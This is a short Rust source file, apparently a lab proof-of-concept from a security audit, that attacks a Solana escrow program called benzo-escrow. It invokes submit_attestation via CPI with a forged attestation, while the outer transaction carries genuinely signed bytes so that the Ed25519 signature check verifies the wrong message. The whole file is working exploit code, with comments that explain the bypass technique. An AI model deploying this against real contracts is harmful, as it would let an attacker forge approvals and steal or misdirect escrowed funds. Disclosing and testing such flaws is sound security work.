//! PoC attacker program (lab only): forwards a *different* instruction to benzo-escrow's
//! submit_attestation via CPI, while the top-level transaction instruction that this program
//! is invoked with carries the signed message bytes at offset 2 (so the Ed25519 precompile's
//! cross-instruction message reference sees the signed bytes, not the CPI'd bytes).
//!
//! instruction data layout: pad(2) || signed_msg(200) || cpi_ix_data(202)
//! accounts: [0]=benzo-escrow program (ro, executable),
//!           [1..]=the 5 accounts submit_attestation expects (crank, auction, ix sysvar,
//!                  approval, system program)
use solana_program::{
    account_info::AccountInfo, entrypoint, entrypoint::ProgramResult, instruction::{AccountMeta, Instruction},
    program::invoke, pubkey::Pubkey,
};

entrypoint!(process_instruction);

fn process_instruction(
    _program_id: &Pubkey,
    accounts: &[AccountInfo],
    data: &[u8],
) -> ProgramResult {
    // data: pad(2) || signed_msg(200) || cpi_ix_data(1 || 2 || forged_att(200)) = 404 bytes
    let cpi_data = data[202..].to_vec();
    let target = accounts[0].key;
    let metas = vec![
        AccountMeta::new(*accounts[1].key, true),  // crank: signer + writable
        AccountMeta::new(*accounts[2].key, false), // auction
        AccountMeta::new_readonly(*accounts[3].key, false), // instructions sysvar
        AccountMeta::new(*accounts[4].key, false), // approval
        AccountMeta::new_readonly(*accounts[5].key, false), // system program
    ];
    let ix = Instruction { program_id: *target, accounts: metas, data: cpi_data };
    invoke(&ix, &accounts[1..])
}
